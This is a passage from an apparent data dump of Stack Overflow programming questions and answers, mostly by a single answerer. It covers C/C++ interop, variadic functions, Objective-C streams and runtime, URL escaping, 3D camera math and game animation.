    double SumStrainEnergy = 0;

    for (int i = 0; i &lt; EnergyArray.size(); i++)
    {
        SumStrainEnergy += EnergyArray[i];  //Effectively sum of array 
                                            //engy[] from CFE.c
    }

    return SumStrainEnergy;
}
</code></pre>

<p>CFE.h</p>

<pre><code>#ifdef __cplusplus
extern ""C"" {
#endif 

void CFE(float density[], float energy[], int NumElem);

#ifdef __cplusplus
 }
#endif
</code></pre>

<p>CFE.c</p>

<pre><code>void CFE(float density[], float energy[], int NumElem)
{
    ...

    float * dens;
    dens = density;  //pass pointer of array density[0] in SA.cpp to CFE.c

    for(n=0; n&lt;NumElem; n++)
    { ... modify dens (e.g. DensityArray from SA.cpp) ... }

    float * engy;
    engy = energy; //pass pointer of array energy[0] in SA.cpp to CFE.c

    for(n=0; n&lt;NumElem; n++)
    { ... modify engy (e.g. EnergyArray from SA.cpp) ... }   
}
</code></pre>

<p>Am I causing an illegal memory access by trying to access the vector elements from the C portion of my program? Is there any sure way to allow this?</p>

<p>Any help would be much appriciated.</p>
","9530","Adam Rosenfield","<p>The code that you've posted is correct.  Provided that every access to an array element inside of <code>CFE()</code> is within bounds, you shouldn't be getting a segmentation fault.  Try running your program under <a href=""http://valgrind.org/"" rel=""nofollow"">valgrind</a> and see if it reports anything unusual.</p>
"
"<p>Today i came across nested functions which i had never heard of. Is it only part of GNU C?</p>

<p>Here is a wikipedia example of nested function.</p>

<pre><code>float E(float x)
{
    float F(float y)
    {
        return x + y;
    }
    return F(3);
}
</code></pre>

<p>From the code, it looks like nested functions are sort of C++ inline functions. So, is it possible to take out the address of nested function?</p>

<p>Edit:</p>

<p>The gcc link given by Adam says that nested function's code is created dynamically on stack. But how do you run code from stack? Shouldn't it be there in code segment. </p>
","9530","Adam Rosenfield","<p>No, they are not part of the C or C++ standard.  They are a GNU extension in the GCC compiler.  See the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Nested-Functions.html"">GCC manual</a> for more information.  It is actually possible to take the address of a nested function, which is done using a technique called <a href=""http://en.wikipedia.org/wiki/Trampoline%5F%28computers%29""><em>trampolines</em></a>, but beware of the caveats listed in the manual.</p>
"
"<p>I'm writing <a href=""http://fly.sf.net"" rel=""nofollow"">.NET On-the-Fly</a> compiler for CLR scripting. And have a dilemma: is it better to throw an exception on build fail or not?</p>

<p>So what is the best-practice point of view, which approach is more suitable?</p>

<pre><code>try
{
  compiler.Compile(); // do not throws an exception only if build succeed
}
catch(CompilerException ex)
{
  string err = ex.Message;
}
</code></pre>

<p>or</p>

<pre><code>compiler.Compile(); // throws an exception only in case of crash, etc
if(!compiler.BuildSucceed)
{
  string err = compiler.Output.ToString();
}
</code></pre>
","9530","Adam Rosenfield","<p>Exceptions should be used for <em>exceptional</em> conditions.  I would say that a failed build isn't <em>exceptional</em>, so you should have your compiler's interface return a value indicating success or failure (e.g. a bool or an enum), and provide an interface for returning a list of errors.  This can be as simple as returning a string of all the errors concatenated together, or it can be something like you passing it an output stream beforehand, and it logs each error to that stream as it comes across them.</p>
"
"<p>I have pdf -files which contents I have not managed to search by any terminal program.
I can only search them by Acrobat Reader and Skim.</p>

<p><strong>How can you search contents of pdf -files in terminal?</strong></p>

<p>It seems that a better question is</p>

<p><strong>How is the search done in the pdf viewers such as Acrobat Reader and Skim?</strong></p>

<p>Perhaps, I need to make such a search tool if no such tools exist.</p>
","9530","Adam Rosenfield","<p>PDF files are usually compressed.  PDF viewers such as Acrobat Reader and Skim search the contents by decompressing the PDF text into memory, and then searching that text.  If you want to search from the command line, one possible suggestion is to use <a href=""http://www.pdfhacks.com/pdftk/"" rel=""nofollow"">pdftk</a> to decompress the PDF, and then use <code>grep</code> (or your favorite command line text searching utility) to find the desired text.  For example:</p>

<pre><code># Search for the text ""text_to_search_for"", and print out 3 lines of context
# above and below each match
pdftk mydoc.pdf output - uncompress | grep -C3 text_to_search_for
</code></pre>
"
"<p>after doing</p>

<pre><code>$ cat /dev/input/by-path/pci-0000:00:02.0-usb-0:2:1.0-event-kbd &gt; ~/test_kbd
</code></pre>

<p>as root, I got a bunch of binary codes (which was expected).  Now, I wanted to know how can I interpret this binary code to figure out what key has been pressed?  What format is the output in?  and is there a reference I could look at that would tell me what key each binary code stands for?</p>

<p>Thanks</p>
","9530","Adam Rosenfield","<p>I would guess that they are scan codes.  <a href=""http://www.computer-engineering.org/ps2keyboard/scancodes2.html"" rel=""nofollow"">This page</a> lists the make and break codes of keys used by modern keyboards.  For more information on PS/2 keyboard programming, see <a href=""http://www.computer-engineering.org/index.html"" rel=""nofollow"">Adam Chapweske's resources</a>.</p>
"
"<p>I have an input 3D vector, along with the pitch and yaw of the camera. Can anyone describe or provide a link to a resource that will help me understand and implement the required transformation and matrix mapping?</p>
","9530","Adam Rosenfield","<p>The world-to-camera transformation matrix is the inverse of the camera-to-world matrix.  The camera-to-world matrix is the combination of a translation to the camera's position and a rotation to the camera's orientation.  Thus, if <em>M</em> is the 3x3 rotation matrix corresponding to the camera's orientation and <em>t</em> is the camera's position, then the 4x4 camera-to-world matrix is:</p>

<pre>
M<sub>00</sub> M<sub>01</sub> M<sub>02</sub> t<sub>x</sub>
M<sub>10</sub> M<sub>11</sub> M<sub>12</sub> t<sub>y</sub>
M<sub>20</sub> M<sub>21</sub> M<sub>22</sub> t<sub>z</sub>
0   0  0   1
</pre>

<p>Note that I've assumed that vectors are column vectors which are multiplied on the right to perform transformations.  If you use the opposite convention, make sure to transpose the matrix.</p>

<p>To find <em>M</em>, you can use one of the formulas listed on <a href=""http://en.wikipedia.org/wiki/Euler%5Fangles#Table%5Fof%5Fmatrices"">Wikipedia</a>, depending on your particular convention for roll, pitch, and yaw.  Keep in mind that those formulas use the convention that vectors are row vectors which are multiplied on the left.</p>

<p>Instead of computing the camera-to-world matrix and inverting it, a more efficient (and numerically stable) alternative is to calculate the world-to-camera matrix directly.  To do so, just invert the camera's position (by negating all 3 coordinates) and its orientation (by negating the roll, pitch, and yaw angles, and adjusting them to be in their proper ranges), and then compute the matrix using the same algorithm.</p>
"
"<p>Some of my http request has 'space' in URL, but it is not recognized by iPhone. I have to change 'space' to '%20' whenever there is a 'space' in the url. Now I have to send a message typed by the user to the server and it can have as many 'spaces' as the user like. It looks like I have to replace them all.(stringByReplacingOccurrencesOfString)</p>

<p>Convert 'space' to '%20' is the one I occasionally find. My question is which of the other characters in NSString cannot be straightly used by url on iPhone?</p>
","9530","Adam Rosenfield","<p>See <a href=""http://tools.ietf.org/html/rfc2396"" rel=""nofollow"">RFC 2396</a> for the full gory details.  The following characters must be escaped:</p>

<pre>
Control characters (ASCII 00-1F and 7F)
Space
&lt;
&gt;
#
%
""
</pre>

<p>The following characters are unwise to use without escaping because some gateways and other transport agents are known to sometimes modify such characters, or they are used as delimiters:</p>

<p><code>{ } | \ ^ [ ] `</code></p>
"
"<p>I have approximately 30 variadic functions. Each one accepts a path as the final argument, e.g.:</p>

<pre><code>bool do_foo(struct *f, int q, const char *fmt, ...)
</code></pre>

<p>In each function, I have to check that the expanded format is less then or equal to a certain size. So, I find myself copy / pasting the same chunk of code to check for how many characters <code>vsnprintf()</code> didn't print, set <code>errno</code> accordingly and bail out of the write.</p>

<p>What I would like to do is write a function to do this, which would return a statically allocated (expanded) string that is known to be a safe size, or newly initialized string on failure, which could be checked against NULL. The checks also have to determine if the string is an absolute or relative path, which influences the safe size of the string. It's a lot of duplicate code and it's starting to smell.</p>

<p>Is there a way that I can pass the contents of the elipsis from my function's entry to another function? Or do I have to call <code>va_start()</code> first, and then pass the <code>va_list</code> to the helper function?</p>

<p><strong>Edit:</strong></p>

<p>I am not at all opposed to passing the <code>va_list</code> to the helper, I just wanted to make sure that nothing else existed. It seems to me the compiler understands where the variadic arguments begin, so I was just curious if I could tell it to pass them along.</p>
","9530","Adam Rosenfield","<p>You can't, you can only pass the arguments as a <code>va_list</code>.  See the <a href=""http://c-faq.com/varargs/handoff.html"">comp.lang.c FAQ</a>.</p>

<p>In general, if you're writing variadic functions (that is, functions which take a variable number of arguments) in C, you should write two versions of each function: one which takes an ellipsis (<code>...</code>), and one which takes a <code>va_list</code>.  The version taking an ellipsis should call <code>va_start</code>, call the version taking a <code>va_list</code>, call <code>va_end</code>, and return.  There's no need for code duplication between the two versions of the function, since one calls the other.</p>
"
"<p>I have seen and used C++ code like the following:</p>

<pre><code>int myFourcc = 'ABCD';
</code></pre>

<p>It works in recent versions of GCC, not sure how recent.
Is this feature in the standard?
What is it called?</p>

<p>I have had trouble searching the web for it...</p>

<p>EDIT:</p>

<p>I found this info as well, for future observers:</p>

<p>from <a href=""http://gcc.gnu.org/onlinedocs/cpp/Implementation%5F002ddefined-behavior.html#Implementation%5F002ddefined-behavior"" rel=""nofollow"" title=""gcc documentation"">gcc documentation</a></p>

<blockquote>
  <p>The compiler values a multi-character character constant a character at a time, shifting the previous value left by the number of bits per target character, and then or-ing in the bit-pattern of the new character truncated to the width of a target character. The final bit-pattern is given type int, and is therefore signed, regardless of whether single characters are signed or not (a slight change from versions 3.1 and earlier of GCC). If there are more characters in the constant than would fit in the target int the compiler issues a warning, and the excess leading characters are ignored.</p>
  
  <p>For example, 'ab' for a target with an 8-bit char would be interpreted as <code>(int) ((unsigned char) 'a' * 256 + (unsigned char) 'b')', and '\234a' as </code>(int) ((unsigned char) '\234' * 256 + (unsigned char) 'a')'. </p>
</blockquote>
","9530","Adam Rosenfield","<p>See section 6.4.4.4, paragraph 10 of the C99 standard:</p>

<blockquote>
  <p>An integer character constant has type <code>int</code>. The value of an integer character constant
  containing a single character that maps to a single-byte execution character is the
  numerical value of the representation of the mapped character interpreted as an integer.
  The value of an integer character constant containing more than one character (e.g.,
  <code>'ab'</code>), or containing a character or escape sequence that does not map to a single-byte
  execution character, is implementation-defined. If an integer character constant contains
  a single character or escape sequence, its value is the one that results when an object with
  type <code>char</code> whose value is that of the single character or escape sequence is converted to
  type <code>int</code>.</p>
</blockquote>

<p>Recall that <em>implementation-defined</em> means that the implementation (in this case, the C compiler) can do whatever it wants, but it <strong>must be documented</strong>.</p>

<p>Most compilers will convert it to an integral constant corresponding to the concatenation of the octets corresponding to the individual characters, but the endianness could be either little- or big-endian, depending on the endianness of the target architecture.</p>

<p>Therefore, portable code should not use multi-character constants and should instead use plain integral constants.  Instead of <code>'abcd'</code>, which could be of either endianness, use either 0x61626364 or 0x64636261, which have known endiannesses (big and little respectively).</p>
"
"<p>I want to send a UIImage to a server through a socket.</p>

<p>a)I open the outputstream:</p>

<pre><code>
- (IBAction)send:(id)sender {
    NSURL *website = [NSURL URLWithString:str_IP];
    NSHost *host = [NSHost hostWithName:[website host]];
    [NSStream getStreamsToHost:host port:1100 inputStream:nil outputStream:&oStream];
    [oStream retain];
    [oStream setDelegate:self];
    [oStream scheduleInRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
    [oStream open];
}
</code></pre>

<p>b) I write NSData to outputstream after open completed and handle the error if error occurs.</p>

<pre><code>
- (void) stream: (NSStream *) stream handleEvent: (NSStreamEvent) eventCode
{
    //printf(""EVENT: Start.\n"");

    switch(eventCode)
    {
    		case NSStreamEventOpenCompleted:
    		{
    			//printf(""EVENT: Open completed.\n"");

    			if(stream == oStream)
    				{
    					//printf(""Sending...\n"");
    					NSData *data = UIImageJPEGRepresentation(drawImage.image, 90);
    					NSInteger x = [oStream write:[data bytes] maxLength:[data length]];
    				}

    			break;
    		}
    		case NSStreamEventEndEncountered:
    		{
    			//printf(""EVENT: End encountered.\n"");
    			break;
    		}
    		case NSStreamEventHasSpaceAvailable:
    		{
    			//printf(""EVENT: Has space available.\n"");
    			break;
    		}
    		case NSStreamEventHasBytesAvailable:
    		{
    			//printf(""EVENT: Has bytes available.\n"");
    			break;
    		}
    		case NSStreamEventErrorOccurred:
    		{
    			UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@""Error Occurred""		
    															message:nil 
    														   delegate:nil				
    												  cancelButtonTitle:@""OK""				
    												  otherButtonTitles:nil];					
    			[alert show];
    			[alert release];
    			break;
    		}
    		case NSStreamEventNone:
    		{
    			//printf(""EVENT: None.\n"");
    			break;
    		}
    }

    //printf(""EVENT: End.\n"");
}

</code></pre>

<p>When I run this code, NSStreamEventOpenCompleted and NSStreamEventErrorOccurred is called.The NSOutputStream's write method was called successfully and all the data is not nil. But after the data is written to the oStream, the eventCode will change to NSStreamEventErrorOccurred. </p>

<p>So I think maybe it's not the correct way to use [oStream write]. What's the correct way to use this message then? I find this message returns an NSInteger of -1073748088, what might be the problem?</p>
","9530","Adam Rosenfield","<p>You should be writing the data only after space becomes available in the output stream.  When the stream finishes opening, it doesn't always immediately have space available, so writing to it won't work.  If you move the <code>write</code> call to the <code>NSStreamEventHasSpaceAvailable</code> handler, it should succeed.</p>

<p>Also, the computer on the other end of the socket has no way of knowing the length of the data you're sending.  Unless you're signaling the end-of-data by closing the socket, you should explicitly send the data length along with the data:</p>

<pre><code>case NSStreamEventHasSpaceAvailable:
{
    if(stream == oStream)
    {
        NSData *data = UIImageJPEGRepresentation(drawImage.image, 90);
        // Convert from host to network endianness
        uint32_t length = (uint32_t)htonl([data length]);
        // Don't forget to check the return value of 'write'
        [oStream write:(uint8_t *)&amp;length maxLength:4];
        [oStream write:[data bytes] maxLength:length];
    }
    break;
}
</code></pre>
"
"<p>I'm working on an openGL project that involves a speaking cartoon face.  My hope is to play the speech (encoded as mp3s) and animate its mouth using the audio data.  I've never really worked with audio before so I'm not sure where to start, but some googling led me to believe my first step would be converting the mp3 to pcm.</p>

<p>I don't really anticipate the need for any Fourier transforms, though that could be nice.  The mouth really just needs to move around when there's audio (I was thinking of basing it on volume). </p>

<p>Any tips on to implement something like this or pointers to resources would be much appreciated.  Thanks!</p>

<p>-S</p>
","9530","Adam Rosenfield","<p>Whatever you do, you're going to need to decode the MP3s into PCM data first.  There are a number of third-party libraries that can do this for you.  Then, you'll need to analyze the PCM data and do some signal processing on it.</p>

<p>Automatically generating realistic lipsync data from audio is a very hard problem, and you're wise to not try to tackle it.  I like your idea of simply basing it on the volume.  One way you could compute the current volume is to use a rolling window of some size (e.g. 1/16 second), and compute the average power in the sound wave over that window.  That is, at frame T, you compute the average power over frames [T-N, T], where N is the number of frames in your window.</p>

<p>Thanks to <a href=""http://en.wikipedia.org/wiki/Parseval%27s%5Ftheorem"" rel=""nofollow"">Parseval's theorem</a>, we can easily compute the power in a wave without having to take the Fourier transform or anything complicated -- the average power is just the sum of the squares of the PCM values in the window, divided by the number of frames in the window.  Then, you can convert the power into a <a href=""http://en.wikipedia.org/wiki/Decibel"" rel=""nofollow"">decibel</a> rating by dividing it by some base power (which can be 1 for simplicity), taking the logarithm, and multiplying by 10.</p>
"
"<p>What are the different ways to handle animations for 3D games?
Do you somehow program the animations in the modeler, and thus the file, than read and implement them in the game, or do you create animation functions to animate your still vectors?</p>

<p>Where are some good tutorials for the programming side of this? Google only gave me the modeler's side.</p>
","9530","Adam Rosenfield","<p>In production environments, animators use specialized tools such as Autodesk's 3DS Max to generate keyframed animations of 3D models.  For each animation for each model, the animator constructs a number of poses for the model called the <em>keyframes</em>, which are then exported out into the game's data format.</p>

<p>The game then loads these keyframes, and to animate the model at a particular time, it picks the two nearest keyframes and interpolates between them to give a smooth animation, even with a small number of keyframes.</p>

<p>Animated models are typically constructed with a bone hierarchy.  There is a root bone, which controls the model's location and orientation within the game world.  All of the other bones are defined relative to some parent bone to create a tree.  Each vertex of the model is tied to a particular bone, so the model can be controlled with a much smaller number of parameters: the relative positions, orientations, and scales of each bone.</p>

<p>Smooth skinning is a technique used to improve the quality of animations.  With smooth skinning, a vertex is not tied to just one bone, but it can be tied to multiple bones (usually a hard limit, such as 4, is set; vertices rarely need more than 3) with corresponding weights.  This makes the animator's job harder, since he has to do a lot more work with vertices near joints, but the result is a much smoother animation with less distortion around the joints.</p>

<p>Alternatively, some games use <em>procedural animation</em>, whereby the animation data is constructed at runtime.  The bone positions and orientations are computed according to some algorithm, such as <a href=""http://en.wikipedia.org/wiki/Inverse%5Fkinematics"">inverse kinematics</a> or <a href=""http://en.wikipedia.org/wiki/Ragdoll%5Fphysics"">ragdoll physics</a>.  Other options are of course available, but they must be coded by programmers.</p>

<p>Instead of procedurally animating the bones and using forward kinematics to determine the locations of all of the model's vertices, another option is to just procedurally generate the position of each vertex on its own.  This allows for more complex animations that aren't bound by bone hierarchies, but of course it's much more complicated and much harder to do well.</p>
"
"<p>I want to get, given a character, its ASCII value.</p>

<p>For example, for the character 'a', I want to get 97, and vice versa.</p>
","9530","Adam Rosenfield","<p>Use <a href=""http://docs.python.org/library/functions.html#chr""><code>chr()</code></a> and <a href=""http://docs.python.org/library/functions.html#ord""><code>ord()</code></a>:</p>

<pre><code>&gt;&gt;&gt; chr(97)
'a'
&gt;&gt;&gt; ord('a')
97
</code></pre>
"
"<p>I don't think I fundamentally understand what an <code>enum</code> is, and when to use it.  </p>

<p>For example:</p>

<pre><code>typedef enum {
    kCircle,
    kRectangle,
    kOblateSpheroid
} ShapeType;
</code></pre>

<p>What is really being declared here?</p>
","9530","Adam Rosenfield","<p>Three things are being declared here: an anonymous enumerated type is declared, <code>ShapeType</code> is being declared a typedef for that anonymous enumeration, and the three names <code>kCircle</code>, <code>kRectangle</code>, and <code>kOblateSpheroid</code> are being declared as integral constants.</p>

<p>Let's break that down.  In the simplest case, an enumeration can be declared as</p>

<pre><code>enum tagname { ... };
</code></pre>

<p>This declares an enumeration with the tag <code>tagname</code>.  In C and Objective-C (but <em>not</em> C++), any references to this <em>must</em> be preceded with the <code>enum</code> keyword.  For example:</p>

<pre><code>enum tagname x;  // declare x of type 'enum tagname'
tagname x;  // ERROR in C/Objective-C, OK in C++
</code></pre>

<p>In order to avoid having to use the <code>enum</code> keyword everywhere, a typedef can be created:</p>

<pre><code>enum tagname { ... };
typedef enum tagname tagname;  // declare 'tagname' as a typedef for 'enum tagname'
</code></pre>

<p>This can be simplified into one line:</p>

<pre><code>typedef enum tagname { ... } tagname;  // declare both 'enum tagname' and 'tagname'
</code></pre>

<p>And finally, if we don't need to be able to use <code>enum tagname</code> with the <code>enum</code> keyword, we can make the <code>enum</code> anonymous and only declare it with the typedef name:</p>

<pre><code>typedef enum { ... } tagname;
</code></pre>

<p>Now, in this case, we're declaring <code>ShapeType</code> to be a typedef'ed name of an anonymous enumeration.  <code>ShapeType</code> is really just an integral type, and should only be used to declare variables which hold one of the values listed in the declaration (that is, one of <code>kCircle</code>, <code>kRectangle</code>, and <code>kOblateSpheroid</code>).  You can assign a <code>ShapeType</code> variable another value by casting, though, so you have to be careful when reading enum values.</p>

<p>Finally, <code>kCircle</code>, <code>kRectangle</code>, and <code>kOblateSpheroid</code> are declared as integral constants in the global namespace.  Since no specific values were specified, they get assigned to consecutive integers starting with 0, so <code>kCircle</code> is 0, <code>kRectangle</code> is 1, and <code>kOblateSpheroid</code> is 2.</p>
"
"<p>I am still learning C++, and I have never really created my own namespaces before.  I was experimenting with them and while I got most things to work, there's one thing that I still can't seem to do.  I would like to be able to call a static method within a class without typing something like <code>NameOfClass::method</code>.  Here is what I thought the code should look like, but it fails to compile:</p>

<p>File <code>A.h</code>,</p>

<pre><code>namespace Test
{
    class A
    {
        public:
            static int foo() { return 42; }
    };
}
</code></pre>

<p>File <code>main.cpp</code>,</p>

<pre><code>#include &lt;iostream&gt;

#include ""A.h""

using namespace std;
using namespace Test::A;

int main()
{
    cout &lt;&lt; foo() &lt;&lt; endl;

    return 0;
}
</code></pre>

<p>The compiler gives me:</p>

<pre><code>main.cpp:6: error: ‘A’ is not a namespace-name
main.cpp:6: error: expected namespace-name before ‘;’ token
main.cpp: In function ‘int main()’:
main.cpp:10: error: ‘foo’ was not declared in this scope
</code></pre>

<p>Is it possible to do what I am trying to do without typing <code>A::foo</code>?</p>
","9530","Adam Rosenfield","<p>No, it's not possible to do what you're trying to do in any elegant fashion.  The closest thing you'll be able to do are to create a macro or an inline function which delegates to your function.  However, both of these alternatives are rather ugly, so I'm not going to post any code samples.  Just bite the bullet and specify the whole name, or refactor your code so that the static methods are just global functions.</p>
"
"<p>I'm referencing another project's target static library. I successfully followed <a href=""http://tinyurl.com/cleuhw"" rel=""nofollow"">instructions from this site</a>. Below is the project using a class named <code>FileIO</code> from the library. </p>

<p>I create a <code>FileIO</code> object and assign a string to its name property. Then I get a <code>__TERMINATING_DUE_TO_UNCAUGHT_EXCEPTION__</code> on the assignment of name.</p>

<p>In <code>applicationDidFinishLaunching</code> I do this:</p>

<pre><code>fileObj = [[FileIO alloc] init];
fileObj.name = @""test"";
</code></pre>

<p>and this is in the .h file:</p>

<pre><code>@class FileIO;

@interface Nav1AppDelegate : NSObject &lt;UIApplicationDelegate&gt; {

    UIWindow *window;
    UINavigationController *navigationController;
    FileIO *fileObj;
}
</code></pre>

<p>In the library, <code>FileIO</code> is a simple class with name in it. I have also tried <code>[fileObj setName:@""test""]</code> but get the same results.  Here's the stack trace:</p>

<pre><code>2009-04-01 20:37:17.721 NavNew[81425:20b] *** -[FileIO setName:]: unrecognized selector sent to instance 0x5219b0

2009-04-01 20:37:17.723 NavNew[81425:20b] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '*** -[FileIO setName:]: unrecognized selector sent to instance 0x5219b0'

2009-04-01 20:37:17.724 NavNew[81425:20b] Stack: (

    2454561035,
    2461146683,
    2454590218,
    2454583564,
    2454583762,
    11275,
    816111650,
    816149355,
    2455110190,
    2454063909,
    2454064344,
    827745792,
    827745989,
    816114848,
    816160924,
    11128,
    10982
)
(gdb) 
</code></pre>

<p>I have discovered this is a problem only with instance members (property or method).  Static methods work fine.  I also opened the library .a file in the hosting project.  I don't see the instance property anywhere in it.</p>

<p>Any suggestions on what I'm doing wrong?</p>
","9530","Adam Rosenfield","<p>For some reason, the <code>FileIO</code> object that you have doesn't respond to the <code>setName:</code> message, so it's throwing an <code>NSInvalidArgumentException</code> when you try to send that message.  My best guess is that the shared library isn't being loaded properly for some reason, so the implementation of <code>setName:</code> isn't getting loaded, so the runtime gets confused and thinks that <code>setName:</code> isn't implemented.</p>

<p>I'm not sure how to go about fixing this, but it does appear that the <code>[[FileIO alloc] init]</code> is succeeding (or at least to the point of not throwing an exception), so something is working at least.  To get the list of messages that are allowed, you can try the following:</p>

<pre><code>unsigned int methodCount;
Method *methods = class_copyMethodList(object_getClass(fileObj), &amp;methodCount);
for(unsigned int i = 0; i &lt; methodCount; i++)
    NSLog(@""Method %u: %s"", i, sel_getName(method_getName(methods[i])));
free(methods);
</code></pre>

<p>For information on the various Objective-C runtime methods, see the <a href=""http://developer.apple.com/DOCUMENTATION/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html"" rel=""nofollow"">Objective-C 2.0 Runtime Reference</a>.</p>
"
"<p>This is a situation I run into now and then:</p>

<p>For an embedded system which does not use virtual addressing, I have an executable file that was compiled from C or C++ code with debugging information included. It's usually in COFF or ELF/DWARF (I get those two mixed up) format.</p>

<p>At runtime, on a PC, I would like to determine the address of a variable given its name. (e.g. ""foo.bar[7].baz"") This allows me to read/write the variable's value on the embedded system (given a debugging protocol that is beyond the scope of this question). Obviously, any variables that are stack-based or heap-based are out since they don't have static addresses.</p>

<p>I've done this before myself in C++ to parse COFF files from TI's compiler for their 2800 series DSPs, and it was kind of a pain. I was wondering if there was a Java library out there that does this sort of thing already, since I'm facing the same thing with one or two other processors' executable files.</p>

<p><hr></p>

<p><strong>Update:</strong> (11/18/2009) A promising clue!</p>

<p>Has anyone out there used the Eclipse CDT ELF parser?</p>

<p>(See <a href=""http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.cdt.doc.isv/reference/api/org/eclipse/cdt/core/model/IBinary.html"" rel=""nofollow"">http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.cdt.doc.isv/reference/api/org/eclipse/cdt/core/model/IBinary.html</a> for one of the javadoc pgs)</p>

<p>TI's Code Composer 4 (based on Eclipse) seems to use this, so it seems like if I can figure out where the documentation is maybe I can use that to solve my problem.</p>
","9530","Adam Rosenfield","<p>You could build a JNI interface to <a href=""http://www.gnu.org/software/binutils/"" rel=""nofollow"">GNU binutils</a> compiled for your platform.  However, if the GPL conflicts with your software's license, then this will not be a viable solution.</p>
"
"<p>Whilst learning the ""assembler language"" (in linux on a x86 architecture using the GNU as assembler), one of the aha moments was the possibility of using <a href=""http://www.ibm.com/developerworks/linux/library/l-system-calls/"">system calls</a>. These system calls come in very handy and are sometimes even necessary as your program <a href=""http://en.wikipedia.org/wiki/Kernel%5Fmode#Supervisor%5Fmode"">runs in user-space</a>.<br />
However system calls are rather expensive in terms of performance as they require an interrupt (and of course a system call) which means that a context switch must be made from your current active program in user-space to the system running in kernel-space.</p>

<p>The point I want to make is this: I'm currently implementing a compiler (for a university project) and one of the extra features I wanted to add is the support for multi-threaded code in order to enhance the performance of the compiled program. Because some of the multi-threaded code will be automatically generated by the compiler itself, this will almost guarantee that there will be really tiny bits of multi-threaded code in it as well. In order to gain a performance win, I must be sure that using threads will make this happen.</p>

<p>My fear however is that, in order to use threading, I <em>must</em> make system calls and the necessary interrupts. The tiny little (auto-generated) threads will therefore be highly affected by the time it takes to make these system calls, which could even lead to a performance loss...</p>

<p><strong>my question is therefore twofold (with an extra bonus question underneath it):</strong>  </p>

<ul>
<li>Is it possible to write assembler
code which can run multiple threads
simultaneously on multiple cores at
once, <em>without</em> the need of system
calls?</li>
<li>Will I get a performance gain if I have really tiny threads (tiny as in the total execution time of the thread), performance loss, or isn't it worth the effort at all?</li>
</ul>

<p>My guess is that multithreaded assembler code is <em>not</em> possible without system calls. Even if this is the case, do you have a suggestion (or even better: some real code) for implementing threads as efficient as possible?</p>

<p>Many thanks!</p>
","9530","","<p>If you want to gain performance, you'll have to leverage kernel threads.  Only the kernel can help you get code running simultaneously on more than one CPU core.  Unless your program is I/O bound (or performing other blocking operations), performing user-mode cooperative multithreading (also known as <a href=""http://en.wikipedia.org/wiki/Fiber%5F%28computer%5Fscience%29"" rel=""nofollow"">fibers</a>) is not going to gain you any performance.  You'll just be performing extra context switches, but the one CPU that your real thread is running will still be running at 100% either way.</p>

<p>System calls have gotten faster.  Modern CPUs have support for the <code>sysenter</code> instruction, which is significantly faster than the old <code>int</code> instruction.  See also <a href=""http://www.trilithium.com/johan/2005/08/linux-gate/"" rel=""nofollow"">this article</a> for how Linux does system calls in the fastest way possible.</p>

<p>Make sure that the automatically-generated multithreading has the threads run for long enough that you gain performance.  Don't try to parallelize short pieces of code, you'll just waste time spawning and joining threads.  Also be wary of memory effects (although these are harder to measure and predict) -- if multiple threads are accessing independent data sets, they will run much faster than if they were accessing the same data repeatedly due to the <a href=""http://en.wikipedia.org/wiki/Cache%5Fcoherency"" rel=""nofollow"">cache coherency</a> problem.</p>
"
"<p>How do you append a NSInteger to NSMutableData. Something allong the lines of...</p>

<pre><code>NSMutableData *myData = [[NSMutableData alloc] init];
NSInteger myInteger = 42;

[myData appendBytes:myInteger length:sizeof(myInteger)];
</code></pre>

<p>So that 0x0000002A will get appended to myData.</p>

<p>Any help appreciated.</p>
","9530","Adam Rosenfield","<p>Pass the address of the integer, not the integer itself.  <code>appendBytes:length:</code> expects a pointer to a data buffer and the size of the data buffer.  In this case, the ""data buffer"" is the integer.</p>

<pre><code>[myData appendBytes:&amp;myInteger length:sizeof(myInteger)];
</code></pre>

<p>Keep in mind, though, that this will use your computer's endianness to encode it.  If you plan on writing the data to a file or sending it across the network, you should use a known endianness instead.  For example, to convert from host (your machine) to network endianness, use <a href=""http://linux.die.net/man/3/htonl""><code>htonl()</code></a>:</p>

<pre><code>uint32_t theInt = htonl((uint32_t)myInteger);
[myData appendBytes:&amp;theInt length:sizeof(theInt)];
</code></pre>
"
"<p>RegOpenKeyEx()</p>

<p>I want to printf(""Success"") or printf(""Failure"") depending on if the function fails or succeeds </p>

<p>How would I do such a conditional while keeping it neat and legible?</p>

<p>I am wanting to stay away from this :</p>

<pre><code>if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,""HUGE LONG KYEY STRUCTURE HERE"",0,KEY_SET_VALUE) != 0 )
{
   //CODE 
}
</code></pre>
","9530","Adam Rosenfield","<p>You could instead use the ternary operator:</p>

<pre><code>bool success = (RegKeyOpenEx(...) == ERROR_SUCCESS);
printf(""%s\n"", success ? ""Success"" : ""Failure"");
</code></pre>
"
"<p>I'm looking for a way to poll for total video memory on board a graphics cars / integrated chipset. </p>

<p>I'm aware of WMI assisted polling under Windows, and as far as I understand that information is constructed on every boot by WMI. However, being an optimist, I am looking for a possible OS independent way to poll for total video memory and free or used video memory. </p>

<p>If not possible, what would be the most elegant way to poll for same under Windows, Linux and OSX?</p>

<p>FYI I don't use DirectX under windows, only OpenGL.</p>
","9530","Adam Rosenfield","<p>There's no simple cross-platform way to do it.  You'll have to either code up a way to do it yourself for each platform, or use a third-party library such as <a href=""http://www.libsdl.org/"" rel=""nofollow"">SDL</a> to do it for you.  For example, with SDL, you can use <code>video_mem</code> member of the return value from <a href=""http://www.libsdl.org/cgi/docwiki.cgi/SDL%5FGetVideoInfo"" rel=""nofollow""><code>SDL_GetVideoInfo()</code></a> to get the total video memory available.</p>
"
"<p>I just got some C code that uses extern ""C"" to declare external functions like this:</p>

<pre><code>extern ""C"" void func();
</code></pre>

<p>Is this valid C?  I'm getting an error at this line,  but I'm not sure if it's because of this or something else.</p>
","9530","Adam Rosenfield","<p>No, it's not valid C.  It should only be used in C++ code to refer to functions defined in C code.  The <code>extern ""C""</code> should be surrounded in a <code>ifdef __cplusplus</code>/<code>#endif</code> block:</p>

<pre><code>// For one function
#ifdef __cplusplus
extern ""C""
#endif
void func();

// For more than one function
#ifdef __cplusplus
extern ""C""
{
#endif

void func1();
void func2();

#ifdef __cplusplus
